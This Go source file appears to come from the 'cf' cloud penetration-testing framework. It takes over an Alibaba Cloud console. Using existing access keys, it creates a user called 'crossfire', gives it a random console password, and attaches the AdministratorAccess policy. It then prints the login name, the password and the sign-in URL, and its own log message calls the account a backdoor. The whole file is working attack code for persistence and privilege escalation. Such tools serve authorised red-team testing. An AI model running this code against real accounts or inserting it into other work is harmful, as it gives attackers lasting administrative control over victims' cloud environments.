package aliram

import (
	"fmt"
	"github.com/aliyun/alibaba-cloud-sdk-go/services/ram"
	log "github.com/sirupsen/logrus"
	"github.com/teamssix/cf/pkg/cloud"
	"github.com/teamssix/cf/pkg/util"
	"github.com/teamssix/cf/pkg/util/errutil"
)

func CreateUser() {
	request := ram.CreateCreateUserRequest()
	request.Scheme = "https"
	request.UserName = "crossfire"
	_, err := RAMClient().CreateUser(request)
	errutil.HandleErrNoExit(err)
	if err == nil {
		log.Debugln("创建 crossfire 用户成功 (Create crossfire user successfully)")
	}
}

func CreateLoginProfile() string {
	request := ram.CreateCreateLoginProfileRequest()
	request.Scheme = "https"
	request.UserName = "crossfire"
	randomPasswords := util.GenerateRandomPasswords()
	request.Password = randomPasswords
	_, err := RAMClient().CreateLoginProfile(request)
	errutil.HandleErrNoExit(err)
	if err == nil {
		log.Debugln("成功为 crossfire 用户创建控制台登录密码 (Successfully created console login password for crossfire user)")
	}
	return randomPasswords
}

func AttachPolicyToUser() {
	request := ram.CreateAttachPolicyToUserRequest()
	request.Scheme = "https"
	request.PolicyType = "System"
	request.PolicyName = "AdministratorAccess"
	request.UserName = "crossfire"
	_, err := RAMClient().AttachPolicyToUser(request)
	errutil.HandleErrNoExit(err)
	if err == nil {
		log.Debugln("成功为 crossfire 用户赋予管理员权限 (Successfully grant AdministratorAccess policy to the crossfire user)")
	}
}

func GetAccountAlias() string {
	request := ram.CreateGetAccountAliasRequest()
	request.Scheme = "https"
	response, err := RAMClient().GetAccountAlias(request)
	errutil.HandleErrNoExit(err)
	accountAlias := response.AccountAlias
	return accountAlias
}

func TakeoverConsole() {
	CreateUser()
	randomPasswords := CreateLoginProfile()
	AttachPolicyToUser()
	accountAlias := GetAccountAlias()
	username := fmt.Sprintf("crossfire@%s", accountAlias)
	data := [][]string{
		{username, randomPasswords, "https://signin.aliyun.com"},
	}
	var header = []string{"用户名 (User Name)", "密码 (Password)", "控制台登录地址 (Login Url)"}
	var td = cloud.TableData{Header: header, Body: data}
	cloud.PrintTable(td, "")
	log.Infoln("接管控制台成功，接管控制台会创建 crossfire 后门用户，如果想删除该后门用户，请执行 cf alibaba console cancel 命令。(Successfully take over the console. Since taking over the console creates the backdoor user crossfire, if you want to delete the backdoor user, execute the command cf alibaba console cancel.)")
}
